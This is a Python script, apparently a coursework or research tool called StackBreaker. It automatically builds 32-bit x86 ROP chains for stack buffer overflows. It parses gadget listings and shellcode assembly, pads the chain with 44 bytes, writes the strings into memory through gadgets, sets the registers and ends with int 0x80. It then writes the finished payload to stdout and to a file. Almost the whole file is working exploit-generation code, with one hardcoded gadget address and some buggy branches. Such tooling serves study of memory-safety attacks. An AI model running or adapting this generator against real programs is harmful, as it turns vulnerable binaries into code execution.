#!/usr/bin/env python3

import re
import argparse
from pathlib import Path
from struct import pack
from struct import unpack
import sys
import os

import Extracted_Functions

# sys.path.append(os.path.abspath('/home/vagrant/synced/StackBreaker'))

parser = argparse.ArgumentParser(
    description = "",
    formatter_class = argparse.ArgumentDefaultsHelpFormatter,
)
# parser.add_argument("--command", default = "/bin/sh")
# parser.add_argument("--envp", default = None)
parser.add_argument("--shellcode", default= None)
parser.add_argument("--out-rop-path", default = None)

def main(args):

    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
    gadgets = removeNone(gadgets)
    # print(gadgets.keys(),gadgets.values())
    rop_chain = b'A'*44
    data_values = []
    null = None
    label_address_map,data_values = reads(args.shellcode, data_address,data_values)
    bytes_pushed,rop_addition,null  = chunking(data_values,data_address, null,label_address_map)
    rop_chain += rop_addition
    rop_chain, register_info = readinstructions(args.shellcode,data_address,data_values,label_address_map,rop_chain,gadgets, null)
    # print(rop_chain.hex())
    # print("----")

    sys.stdout.buffer.write(rop_chain)

    file_path = "chain"
    try:
        with open(file_path, 'wb') as file:  # 'xb' mode for creating and writing in binary
            file.write(rop_chain)
    except FileExistsError:
        print(f"The file '{file_path}' already exists.")
        
    for address in rop_chain:
        hex_address = hex(address)
        print(f"{hex_address}")

def reads(file_name,data_address,data_values):
    rodata_start = False
    # rodata_contents = []
    # rodata_start = False
    label_address_map = {}
    current_address = data_address
      
    try:
        with open(file_name, 'r') as file:
            for line in file:
                line = line.strip()  

                if '.rodata' in line:
                    rodata_start = True
                    continue
                if rodata_start:
                    # Check for a label
                    if ':' in line:
                        label, data = line.split(':', 1)
                        label = label.strip()
                        data = data.strip()
                        if(label == 'filename'):
                            label_address_map[label] = current_address 
                        elif(label == 'argv'): 
                            label_address_map[label] = current_address + 2
                        else: 
                            label_address_map[label] = current_address + 1
                        if 'db' in data or 'dw' in data or 'dd' in data or 'dq' in data or 'dt' in data:
                            # Parse the data line
                            items, current_address = parse_assembly_line(data, current_address)
                            for item in items:
                                data_values.append(item)
                                # print(data_values, "data_values")
                        elif 'equ' in data:
                            # Get the value of the equ
                            value = data.split(' ')[3]
                            if value in label_address_map:
                                # label_address_map[label] = current_address + len(data_values[0]) 
                                data_values.append(len(data_values[0]))
                                current_address += len(data_values[0])

    except FileNotFoundError:
        print(f"The file {file_name} was not found.")
    except Exception as e:
         print(f"An error occurred: {e}")
    print(label_address_map, "label_address_map")
    return label_address_map,data_values


def parse_out_rop(path: Path):
    rop_gadgets = {
        ": mov dword ptr [edx], eax ; ret": None,
        ": pop edx ; ret": None,
        ": pop eax ; ret": None,
        ": xor eax, eax ; ret": None,
        ": xor ecx, ecx ; ret": None,
        ": xor edx, edx ; ret": None,
        ": xor ebx, ebx ; ret": None,
        ": and edx, 0 ; ret": None, 
        ": sub edx, edx ; ret": None, 
        ": and eax, 0 ; ret": None,
        ": sub eax, edx ; ret": None,
        ": and ebx, 0 ; ret": None,
        ": sub ebx, edx ; ret": None, 
        ": and ecx, 0 ; ret": None,
        ": sub ecx, edx ; ret": None, 
        ": inc eax ; ret": None,
        ": inc ebx ; ret": None,
        ": inc ecx ; ret": None,
        ": inc edx ; ret": None,
        ": pop ebx ; ret": None,
        ": pop ecx ; ret": None,
        ": pop ecx ; pop ebx ; ret": None,
        ": int 0x80": None,
    }

    data_address = None
    data_addrPat = re.compile(r",\s*([^)]*)")

    with open(path) as out_rop:
        for line in out_rop:
            if ".data" in line and data_address is None:
                match = data_addrPat.search(line)
                if match:
                    extracted_part = match.group(1)
                    data_address = int(extracted_part,16)
            elif any(gadget in line for gadget in rop_gadgets.keys()):
                tokens = line.split()
                gadget_key = ' '.join(tokens[1:])
                rop_gadgets[gadget_key] = int(tokens[0],16)

    return rop_gadgets, data_address

def chunking(array, data_address, null,label_address_map):
    stack_pointer = data_address
    print(data_address, "data_address")
    pointers = []
    rop_chain = b''
    # print(array, "array")
    # print(label_address_map, "label_address_map")

    for string in array:
            if string in label_address_map:
                    rop_chain += Extracted_Functions.push_ptr(label_address_map[string], stack_pointer)
                    stack_pointer += 4


            elif (string == '0'):
                    rop_add , null = Extracted_Functions.push_null(stack_pointer,null)
                    rop_chain += rop_add
                    stack_pointer += 4
            else:
                pointers.append(stack_pointer)
                # Split string into chunks of size 4.
                chunks = [string[i:i + 4] for i in range(0, len(string), 4)]
                # Convert string to bytes.
                chunks = [chunk.encode('ascii') for chunk in chunks]
                print(chunks, "chunks")
                # If the chunk isn't big enough, pad it with null characters.
                chunks = [chunk.ljust(4, b'\0') for chunk in chunks]

                for chunk in chunks:
                    rop_chain += Extracted_Functions.push_bytes(chunk, stack_pointer)
                    stack_pointer += 4
    

    bytes_pushed = stack_pointer - data_address
    return  bytes_pushed, rop_chain, null
    



def readinstructions(file_name, data_address, data_values, contents,rop_chain,gadgets,null):
    register_info = dict({'ebx': None,
                           'eax': None,
                           'ecx': None,
                           'edx': None,})
    try:
        with open(file_name, 'r') as file:
            for line in file:
                line = line.strip()
                if 'mov' in line:
                    # Split the line by spaces
                    parts = line.split()
                    if len(parts) > 1:
                        # Split the second part by comma and remove any trailing commas
                        arg1 = parts[1].rstrip(',')
                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
                        # Call the mov function with the extracted arguments
                        if arg1 and arg2:
                            rop_chain, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
                elif 'xor' in line:
                    # Split the line by spaces
                    parts = line.split()
                    if len(parts) > 1:
                        # Split the second part by comma and remove any trailing commas
                        arg1 = parts[1].rstrip(',')
                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
                        # Call the mov function with the extracted arguments
                        if arg1 and arg2:
                            rop_chain = xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                elif 'int' in line:
                    parts = line.split()
                    rop_chain = intline(parts[0],parts[1], data_values,contents,rop_chain,gadgets,register_info)

    except FileNotFoundError:
        print(f"The file {file_name} was not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    return rop_chain, register_info
    
def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
        if ar2 in contents:
            # value = hex(contents.get(ar2))
            if(ar1 == 'ecx'):
                if ": pop ecx ; ret" in gadgets: 
                    rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2)) 
                    register_info[ar1] = ar2
                if ": pop ecx ; pop ebx ; ret" in gadgets:
                    rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    rop_chain += pack('<I', contents.get(register_info.get('ebx')))
                    register_info[ar1] = ar2
                    print("2")
            elif(ar1 == 'ebx'):   
                if ": pop ebx ; ret" in gadgets: 
                    rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2
                    print("1")
            elif(ar1 == 'eax'):    
                if ": pop eax ; ret" in gadgets:
                    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2
            elif(ar1 == 'edx'):    
                if ': pop edx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2

        elif (is_string_an_int(ar2)):
            # rop_chain = xor(ar1,ar1,data_values,contents,rop_chain,gadgets,register_info)
            rop_chain += pack('<I', 0x08056190) # xor eax, eax ; ret
            for i in range(int(ar2)):  
                if(ar1 == 'ecx'):
                    if ': inc ecx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc ecx ; ret"])
                        register_info[ar1] = ar2

                elif(ar1 == 'edx'):
                    if ': inc edx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc edx ; ret"])
                        register_info[ar1] = ar2

                elif(ar1 == 'eax'):
                    if ': inc eax ; ret' in gadgets:

                        rop_chain += pack('<I', gadgets[": inc eax ; ret"])
                        register_info[ar1] = ar2   
                        print("4")
                
                elif(ar1 == 'ebx'):
                    if ': inc ebx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc ebx ; ret"])
                        register_info[ar1] = ar2
                        

    return rop_chain,register_info

def xor(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info,null):
    
    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
        if (ar1 == 'edx'):
            condition1 = ': and edx, 0 ; ret' in gadgets
            condition2 = ': mov edx, 0 ; ret' in gadgets
            condition3 = ': sub edx, edx ; ret' in gadgets

            if ar1 == ar2:
                if ': xor edx, edx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor edx, edx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and edx, 0 ; ret'])
                    elif condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    elif condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub edx, edx ; ret'])
                else:
                        if ": pop edx ; ret" in gadgets: 
                            rop_chain += pack('<I', gadgets[": pop edx ; ret"])
                            rop_chain += pack('<I', null) 
                            print("3")
        if (ar1 == 'ebx'):
            condition1 = ': and ebx, 0 ; ret' in gadgets
            condition2 = ': mov ebx, 0 ; ret' in gadgets
            condition3 = ': sub ebx, ebx ; ret' in gadgets
            if ar1 == ar2:
                if ': xor ebx, ebx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor ebx, ebx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and ebx, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub ebx, ebx ; ret'])
                else:
                        print("6")
                        if ": pop ebx ; ret" in gadgets: 
                            rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
                            rop_chain += pack('<I', null)
                    
        if (ar1 == 'ecx'):
            condition1 = ': and ecx, 0 ; ret' in gadgets
            condition2 = ': mov ecx, 0 ; ret' in gadgets
            condition3 = ': sub ecx, ecx ; ret' in gadgets

            if ar1 == ar2:
                if ': xor ecx, ecx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor ecx, ecx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and ecx, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub ecx, ecx ; ret'])
                    else:
                        if ": pop ecx ; ret" in gadgets: 
                            rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
                            rop_chain += pack('<I', null)

        if (ar1 == 'eax'):
            condition1 = ': and eax, 0 ; ret' in gadgets
            condition2 = ': mov eax, 0 ; ret' in gadgets
            condition3 = ': sub eax, eax ; ret' in gadgets

            if ar1 == ar2:
                if ': xor eax, eax ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and eax, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub eax, eax ; ret'])
                else:
                    if ": pop eax ; ret" in gadgets: 
                        rop_chain += pack('<I', gadgets[": pop eax ; ret"])
                        rop_chain += pack('<I', null)

    return rop_chain

def intline(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
    if(ar2 == '0x80'):
        rop_chain += pack('<I', gadgets[": int 0x80"])
        print("5")

    return rop_chain    


def is_string_an_int(s):
    try:
        int(s)
        return True
    except ValueError:
        return False


def removeNone(gadgets):
    for key in list(gadgets.keys()):  
        if gadgets[key] is None:
            del gadgets[key]

    return gadgets

def parse_assembly_line(data_line,current_address):
    # Determine the directive used (db, dw, dd, dq, dt)
    directive_match = re.search(r'db|dw|dd|dq|dt', data_line)
    if not directive_match:
        return [], 0  # No recognized directive found

    directive = directive_match.group()
    data_part = data_line.replace(directive, '').strip()

    # Use regular expression to match string literals and other items
    pattern = r'\".*?\"|[^\s,]+'
    items = re.findall(pattern, data_part)

    # Process each item
    processed_items = []
    for item in items:
        item = item.strip()
        if item.startswith('"') and item.endswith('"'):
            # Remove the double quotes for string literals
            processed_items.append(item[1:-1])
            
        elif item:
            # Append non-empty, non-string items after stripping trailing commas
            processed_items.append(item.rstrip(','))

    # Determine the byte size per item based on the directive
    bytes_per_item = {'db': 1, 'dw': 2, 'dd': 4, 'dq': 8, 'dt': 10}.get(directive, 1)
    for i in range(len(processed_items)):
        if(processed_items[i] == '0'):
            total_bytes = 4
            current_address += total_bytes
        else: 

                total_bytes = len(processed_items[i]) * bytes_per_item
                current_address += total_bytes


    return processed_items, current_address

if __name__ == "__main__":
    main(parser.parse_args())